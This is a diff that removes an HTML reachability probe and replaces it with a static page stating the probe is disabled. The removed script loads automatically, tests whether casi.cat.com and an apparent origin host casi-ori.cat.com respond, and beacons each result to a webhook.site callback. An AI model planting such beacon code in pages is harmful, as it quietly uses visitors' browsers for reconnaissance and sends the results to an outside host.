@@ -1,65 +1,7 @@
 <!doctype html>
 <meta charset="utf-8">
-<meta name="referrer" content="no-referrer">
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; connect-src https://casi.cat.com https://casi-ori.cat.com; img-src https://webhook.site; base-uri 'none'; form-action 'none'">
-<title>CASI safe origin reachability probe</title>
-<img alt="" referrerpolicy="no-referrer" src="https://webhook.site/5dc61344-cd84-40c9-a86e-1bf1b98e0939/b96783ed4154/html_start">
-<pre id="result">CASI SAFE ORIGIN REACHABILITY PROBE</pre>
-<script>
-const callbackBase = 'https://webhook.site/5dc61344-cd84-40c9-a86e-1bf1b98e0939/b96783ed4154/';
-const output = document.getElementById('result');
-const callbackImages = [];
-
-function mark(label) {
-  output.textContent += `\n${label}`;
-  const image = new Image();
-  image.referrerPolicy = 'no-referrer';
-  image.src = `${callbackBase}${label}`;
-  callbackImages.push(image);
-}
-
-async function probe(label, url) {
-  const controller = new AbortController();
-  let timedOut = false;
-  const timer = setTimeout(() => {
-    timedOut = true;
-    controller.abort();
-  }, 12000);
-
-  try {
-    await fetch(url, {
-      method: 'GET',
-      mode: 'no-cors',
-      credentials: 'omit',
-      cache: 'no-store',
-      redirect: 'manual',
-      referrerPolicy: 'no-referrer',
-      signal: controller.signal
-    });
-    mark(`${label}_response`);
-    return true;
-  } catch (_) {
-    mark(`${label}_${timedOut ? 'timeout' : 'network_error'}`);
-    return false;
-  } finally {
-    clearTimeout(timer);
-  }
-}
-
-(async () => {
-  mark('start');
-  const controlWorked = await probe(
-    'control',
-    'https://casi.cat.com/backend/favicon.php?origin_probe=b96783ed4154'
-  );
-  if (controlWorked) {
-    await probe(
-      'origin',
-      'https://casi-ori.cat.com/backend/favicon.php?origin_probe=b96783ed4154'
-    );
-  } else {
-    mark('origin_skipped');
-  }
-  mark('complete');
-})();
-</script>
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'">
+<title>CASI probe disabled</title>
+<style>body{font:18px monospace;padding:24px}</style>
+<h1>CASI SAFE PROBE DISABLED</h1>
+<p>This page makes no network requests and executes no JavaScript.</p>
